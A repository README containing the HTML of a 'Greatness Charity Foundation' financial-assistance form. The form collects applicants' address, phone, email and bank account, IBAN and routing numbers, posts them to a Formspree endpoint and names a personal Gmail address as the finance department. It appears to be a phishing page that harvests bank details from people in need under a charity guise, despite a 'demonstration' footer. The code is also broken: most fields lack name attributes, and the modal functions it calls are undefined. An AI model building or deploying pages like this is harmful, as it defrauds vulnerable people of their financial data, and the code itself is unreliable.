# Greatness-Charity
Charity assistance application form 
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Greatness Charity Foundation - Assistance Application</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&amp;family=Playfair+Display:wght@700&display=swap');
        
        body {
            font-family: 'Inter', system-ui, sans-serif;
        }
        
        .heading-font {
            font-family: 'Playfair Display', sans-serif;
        }
        
        .form-section {
            transition: all 0.3s ease;
        }
        
        .form-section:hover {
            box-shadow: 0 10px 15px -3px rgb(0 0 0 / 0.1);
        }
        
        input:focus, textarea:focus, select:focus {
            outline: none;
            border-color: #2563eb;
            box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.2);
        }
    </style>
</head>
<body class="bg-gray-50">
    <!-- Header -->
    <header class="bg-white border-b border-gray-200">
        <div class="max-w-4xl mx-auto px-6 py-8">
            <div class="flex items-center justify-between">
                <div class="flex items-center gap-4">
                    <div class="w-12 h-12 bg-emerald-600 rounded-2xl flex items-center justify-center text-white text-3xl font-bold">G</div>
                    <div>
                        <h1 class="heading-font text-3xl font-bold text-gray-900">Greatness</h1>
                        <p class="text-sm text-gray-500 tracking-wider">CHARITY FOUNDATION</p>
                    </div>
                </div>
                <div class="text-right">
                    <p class="text-sm text-emerald-600 font-medium">Assistance Application Form</p>
                    <p class="text-xs text-gray-500">Confidential • Secure</p>
                </div>
            </div>
        </div>
    </header>

    <div class="max-w-4xl mx-auto px-6 py-12">
        <!-- Intro -->
        <div class="max-w-2xl mx-auto text-center mb-12">
            <h2 class="heading-font text-4xl font-bold text-gray-900 mb-4">Apply for Financial Assistance</h2>
            <p class="text-lg text-gray-600">
                Greatness Charity Foundation is committed to helping individuals and families in need. 
                All information provided is kept strictly confidential and used only for evaluating your application.
            </p>
            <div class="mt-6 inline-flex items-center gap-2 bg-emerald-50 text-emerald-700 px-4 py-2 rounded-2xl text-sm">
                <i class="fas fa-shield-alt"></i>
                <span>Your privacy is our priority</span>
            </div>
        </div>

        <!-- Form -->
        <form id="assistanceForm" action="https://formspree.io/f/xjgnvnwp" method="POST" class="bg-white rounded-3xl shadow-xl p-10 space-y-10">
    <!-- Hidden fields for better emails -->
    <input type="hidden" name="_subject" value="New Charity Assistance Application">
    <input type="hidden" name="_replyto" value="Financedept2026@gmail.com">
    <input type="hidden" name="_next" value="https://2sz6rhrwp2-lab.github.io/Greatness-Charity/?success=true">
            
            <!-- Personal Information -->
            <div class="form-section bg-gray-50 border border-gray-100 rounded-2xl p-8">
                <h3 class="text-xl font-semibold text-gray-900 mb-6 flex items-center gap-3">
                    <i class="fas fa-user text-emerald-600"></i>
                    Personal Information
                </h3>
                
                <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
                    <div>
                        <label class="block text-sm font-medium text-gray-700 mb-2">Full Name <span class="text-red-500">*</span></label>
                        <input type="text" id="fullName" required
                               class="w-full px-5 py-4 rounded-2xl border border-gray-300 focus:border-emerald-500 bg-white">
                    </div>
                    <div>
                        <label class="block text-sm font-medium text-gray-700 mb-2">Age <span class="text-red-500">*</span></label>
                        <input type="number" id="age" min="18" max="120" required
                               class="w-full px-5 py-4 rounded-2xl border border-gray-300 focus:border-emerald-500 bg-white">
                    </div>
                </div>

                <div class="mt-6">
                    <label class="block text-sm font-medium text-gray-700 mb-2">Full Address <span class="text-red-500">*</span></label>
                    <textarea id="address" rows="3" required
                              class="w-full px-5 py-4 rounded-2xl border border-gray-300 focus:border-emerald-500 bg-white resize-y"></textarea>
                </div>

                <div class="grid grid-cols-1 md:grid-cols-2 gap-6 mt-6">
                    <div>
                        <label class="block text-sm font-medium text-gray-700 mb-2">Phone Number <span class="text-red-500">*</span></label>
                        <input type="tel" id="phone" required
                               class="w-full px-5 py-4 rounded-2xl border border-gray-300 focus:border-emerald-500 bg-white">
                    </div>
                    <div>
                        <label class="block text-sm font-medium text-gray-700 mb-2">Email Address <span class="text-red-500">*</span></label>
                        <input type="email" id="email" required
                               class="w-full px-5 py-4 rounded-2xl border border-gray-300 focus:border-emerald-500 bg-white">
                    </div>
                </div>
            </div>

            <!-- Financial Need -->
            <div class="form-section bg-gray-50 border border-gray-100 rounded-2xl p-8">
                <h3 class="text-xl font-semibold text-gray-900 mb-6 flex items-center gap-3">
                    <i class="fas fa-hand-holding-dollar text-emerald-600"></i>
                    Financial Need
                </h3>
                
                <div>
                    <label class="block text-sm font-medium text-gray-700 mb-2">Amount Needed (USD) <span class="text-red-500">*</span></label>
                    <div class="relative">
                        <span class="absolute left-5 top-1/2 -translate-y-1/2 text-gray-500">$</span>
                        <input type="number" id="amountNeeded" min="50" step="10" required
                               class="w-full pl-10 pr-5 py-4 rounded-2xl border border-gray-300 focus:border-emerald-500 bg-white">
                    </div>
                </div>

                <div class="mt-6">
                    <label class="block text-sm font-medium text-gray-700 mb-2">Please describe your current situation and how the funds will be used <span class="text-red-500">*</span></label>
                    <textarea id="needDescription" rows="5" required placeholder="e.g., Medical bills, rent assistance, job loss, etc."
                              class="w-full px-5 py-4 rounded-2xl border border-gray-300 focus:border-emerald-500 bg-white"></textarea>
                </div>
            </div>

            <!-- Payment Information -->
            <div class="form-section bg-gray-50 border border-gray-100 rounded-2xl p-8">
                <h3 class="text-xl font-semibold text-gray-900 mb-6 flex items-center gap-3">
                    <i class="fas fa-bank text-emerald-600"></i>
                    Payment Information
                </h3>
                
                <div class="bg-amber-50 border border-amber-200 rounded-2xl p-5 mb-6">
                    <p class="text-amber-800 text-sm">
                        <i class="fas fa-info-circle mr-2"></i>
                        Prepaid cards and cash apps are not accepted. Funds will be transferred directly to a verified bank account.
                    </p>
                </div>

                <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
                    <div>
                        <label class="block text-sm font-medium text-gray-700 mb-2">Bank / Financial Institution <span class="text-red-500">*</span></label>
                        <input type="text" id="bankName" required placeholder="e.g., Chase Bank"
                               class="w-full px-5 py-4 rounded-2xl border border-gray-300 focus:border-emerald-500 bg-white">
                    </div>
                    <div>
                        <label class="block text-sm font-medium text-gray-700 mb-2">Account Holder Name <span class="text-red-500">*</span></label>
                        <input type="text" id="accountHolder" required
                               class="w-full px-5 py-4 rounded-2xl border border-gray-300 focus:border-emerald-500 bg-white">
                    </div>
                </div>

                <div class="mt-6">
                    <label class="block text-sm font-medium text-gray-700 mb-2">Account Number / IBAN <span class="text-red-500">*</span></label>
                    <input type="text" id="accountNumber" required
                           class="w-full px-5 py-4 rounded-2xl border border-gray-300 focus:border-emerald-500 bg-white font-mono">
                </div>

                <div class="mt-6 grid grid-cols-1 md:grid-cols-2 gap-6">
                    <div>
                        <label class="block text-sm font-medium text-gray-700 mb-2">Routing Number / SWIFT Code</label>
                        <input type="text" id="routingNumber"
                               class="w-full px-5 py-4 rounded-2xl border border-gray-300 focus:border-emerald-500 bg-white font-mono">
                    </div>
                    <div>
                        <label class="block text-sm font-medium text-gray-700 mb-2">Have you received assistance from Greatness Charity Foundation before? <span class="text-red-500">*</span></label>
                        <div class="flex gap-6 mt-3">
                            <label class="flex items-center gap-2">
                                <input type="radio" name="previousRecipient" value="yes" required class="w-5 h-5 accent-emerald-600">
                                <span>Yes</span>
                            </label>
                            <label class="flex items-center gap-2">
                                <input type="radio" name="previousRecipient" value="no" required class="w-5 h-5 accent-emerald-600">
                                <span>No</span>
                            </label>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Additional Information -->
            <div class="form-section bg-gray-50 border border-gray-100 rounded-2xl p-8">
                <h3 class="text-xl font-semibold text-gray-900 mb-6 flex items-center gap-3">
                    <i class="fas fa-info-circle text-emerald-600"></i>
                    Additional Information
                </h3>
                
                <div class="space-y-6">
                    <div>
                        <label class="block text-sm font-medium text-gray-700 mb-2">Number of Dependents (including yourself)</label>
                        <input type="number" id="dependents" min="1" value="1"
                               class="w-full px-5 py-4 rounded-2xl border border-gray-300 focus:border-emerald-500 bg-white">
                    </div>

                    <div>
                        <label class="block text-sm font-medium text-gray-700 mb-2">Current Employment Status</label>
                        <select id="employment" 
                                class="w-full px-5 py-4 rounded-2xl border border-gray-300 focus:border-emerald-500 bg-white">
                            <option value="">Select...</option>
                            <option value="unemployed">Unemployed</option>
                            <option value="part-time">Part-time</option>
                            <option value="full-time">Full-time</option>
                            <option value="disabled">Disabled / Unable to work</option>
                            <option value="retired">Retired</option>
                        </select>
                    </div>

                    <div>
                        <label class="block text-sm font-medium text-gray-700 mb-2">How did you hear about Greatness Charity Foundation?</label>
                        <select id="referral" 
                                class="w-full px-5 py-4 rounded-2xl border border-gray-300 focus:border-emerald-500 bg-white">
                            <option value="">Select...</option>
                            <option value="friend">Friend or Family</option>
                            <option value="social">Social Media</option>
                            <option value="community">Community Organization</option>
                            <option value="website">Website / Search</option>
                            <option value="other">Other</option>
                        </select>
                    </div>
                </div>
            </div>

            <!-- Consent -->
            <div class="pt-6 border-t border-gray-200">
                <label class="flex items-start gap-3 cursor-pointer">
                    <input type="checkbox" id="consent" required class="mt-1 w-5 h-5 accent-emerald-600">
                    <span class="text-sm text-gray-600">
                        I certify that the information provided is true and accurate to the best of my knowledge. 
                        I understand that false information may result in disqualification from assistance.
                        I consent to the processing of my personal data for the purpose of this application.
                    </span>
                </label>
            </div>

            <button type="submit"
                    class="w-full bg-emerald-600 hover:bg-emerald-700 transition-colors text-white font-semibold py-6 rounded-3xl text-lg flex items-center justify-center gap-3">
                <span>Submit Application</span>
                <i class="fas fa-arrow-right"></i>
            </button>
        </form>

        <p class="text-center text-xs text-gray-500 mt-8">
            All applications are reviewed within 5-7 business days. You will be contacted via email if selected.
        </p>
    </div>

    <!-- View Submissions (Admin) -->
    <div class="max-w-4xl mx-auto px-6 pb-12">
        <div onclick="showSubmissions()" 
             class="cursor-pointer bg-white border border-dashed border-gray-300 hover:border-emerald-300 rounded-3xl p-8 text-center">
            <i class="fas fa-folder-open text-4xl text-gray-400 mb-4"></i>
            <p class="font-medium text-gray-700">View Submitted Applications</p>
            <p class="text-sm text-gray-500">(Stored locally in your browser)</p>
        </div>
    </div>

    <!-- Submissions Modal -->
    <div id="submissionsModal" class="hidden fixed inset-0 bg-black/70 flex items-center justify-center z-50">
        <div class="bg-white rounded-3xl max-w-3xl w-full mx-4 max-h-[90vh] overflow-hidden">
            <div class="flex items-center justify-between border-b px-8 py-6">
                <h3 class="text-2xl font-semibold">Submitted Applications</h3>
                <button onclick="closeModal()" class="text-gray-400 hover:text-gray-600 text-3xl leading-none">×</button>
            </div>
            <div id="submissionsList" class="p-8 max-h-[60vh] overflow-auto space-y-6">
                <!-- Populated by JS -->
            </div>
            <div class="border-t px-8 py-6 text-right">
                <button onclick="clearSubmissions()" 
                        class="text-red-600 hover:text-red-700 text-sm font-medium">Clear All Submissions</button>
            </div>
        </div>
    </div>

    <footer class="bg-white py-8 border-t">
        <div class="max-w-4xl mx-auto px-6 text-center text-gray-500 text-sm">
            Greatness Charity Foundation • For demonstration purposes only<br>
            In production, connect this form to a secure backend (Google Forms, Airtable, Firebase, etc.)
        </div>
    </footer>

    <script>
    const form = document.getElementById('assistanceForm');

    form.addEventListener('submit', function(e) {
        // Formspree will handle the submission
        // Optional: keep localStorage as backup
        const formData = {
            fullName: document.getElementById('fullName').value,
            age: document.getElementById('age').value,
            address: document.getElementById('address').value,
            phone: document.getElementById('phone').value,
            email: document.getElementById('email').value,
            amountNeeded: document.getElementById('amountNeeded').value,
            needDescription: document.getElementById('needDescription').value,
            bankName: document.getElementById('bankName').value,
            accountHolder: document.getElementById('accountHolder').value,
            accountNumber: document.getElementById('accountNumber').value,
            routingNumber: document.getElementById('routingNumber').value,
            previousRecipient: document.querySelector('input[name="previousRecipient"]:checked') ? 
                              document.querySelector('input[name="previousRecipient"]:checked').value : '',
            dependents: document.getElementById('dependents').value,
            employment: document.getElementById('employment').value,
            referral: document.getElementById('referral').value,
        };

        // Optional: still save locally
        let submissions = JSON.parse(localStorage.getItem('greatnessCharitySubmissions')) || [];
        submissions.unshift({ ...formData, timestamp: new Date().toLocaleString() });
        localStorage.setItem('greatnessCharitySubmissions', JSON.stringify(submissions));

        // Let Formspree handle redirect / success
    });
</script>
</body>
</html>
